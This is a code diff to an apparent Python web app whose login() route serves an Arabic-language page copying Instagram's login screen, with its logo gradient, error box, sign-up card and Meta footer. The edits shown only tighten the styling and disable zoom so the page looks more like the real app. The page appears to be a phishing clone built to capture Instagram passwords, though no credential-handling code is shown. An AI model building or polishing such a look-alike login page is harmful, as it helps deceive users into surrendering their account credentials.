@@ -48,7 +48,7 @@ def login():
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
@@ -62,56 +62,57 @@ def login():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
+            overflow: hidden;
+            padding: 10px 20px 8px 20px;
         }
         
         .main-container { 
             width: 100%; 
             max-width: 350px; 
-            padding: 20px; 
             display: flex; 
             flex-direction: column; 
             justify-content: center; 
             flex-grow: 1; 
             text-align: center; 
+            margin: auto 0;
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
         }
 
         .insta-icon-container {
-            margin-bottom: 25px;
+            margin-bottom: 18px;
             display: flex;
             justify-content: center;
         }
         
-        /* تم تصغير حجم الشعار هنا */
         .insta-icon {
-            width: 52px;
-            height: 52px;
+            width: 48px;
+            height: 48px;
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-            border-radius: 14px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         .insta-icon svg {
-            width: 30px;
-            height: 30px;
+            width: 26px;
+            height: 26px;
             fill: white;
         }
 
         .error-msg { 
             color: #ed4956; 
-            font-size: 13px; 
-            line-height: 18px; 
-            margin-bottom: 15px; 
+            font-size: 12px; 
+            line-height: 16px; 
+            margin-bottom: 10px; 
             text-align: center; 
             font-weight: 400; 
             background: #1c1c1c; 
-            padding: 12px; 
+            padding: 10px; 
             border-radius: 8px; 
             border: 1px solid #331a1a; 
         }
@@ -123,7 +124,7 @@ def login():
             background: #121212; 
             border: 1px solid #262626; 
             border-radius: 8px; 
-            padding: 14px 12px; 
+            padding: 11px 12px; 
             font-size: 14px; 
             color: #f5f5f5; 
             outline: none; 
@@ -137,20 +138,21 @@ def login():
             color: white; 
             border: none; 
             border-radius: 8px; 
-            padding: 12px; 
+            padding: 11px; 
             font-size: 14px; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-top: 10px; 
-            margin-bottom: 15px; 
+            margin-top: 6px; 
+            margin-bottom: 12px; 
         }
         .submit-btn:hover { background: #1877f2; }
 
-        .forgot-pass { color: #f5f5f5; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 400; }
+        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
 
         .footer-section { 
             width: 100%; 
-            padding-bottom: 25px; 
+            max-width: 350px;
+            padding-bottom: 4px; 
             text-align: center; 
             display: flex; 
             flex-direction: column; 
@@ -158,9 +160,8 @@ def login():
         }
         
         .signup-card { 
-            padding: 12px; 
-            width: 90%; 
-            max-width: 350px; 
+            padding: 11px; 
+            width: 100%; 
             border: 1px solid #262626; 
             border-radius: 8px; 
             text-align: center; 
@@ -168,15 +169,15 @@ def login():
             color: #0095f6; 
             font-weight: 600; 
             cursor: pointer; 
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
 
         .meta-footer { display: flex; align-items: center; justify-content: center; }
         .meta-brand {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 600;
             color: #737373;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
     </style>
 </head>
@@ -214,7 +215,7 @@ def login():
             إنشاء حساب جديد
         </div>
         <div class="meta-footer">
-            <div class="meta-brand">∞ Meta</div>
+            <div class="meta-brand">Meta ∞</div>
         </div>
     </div>
 </body>
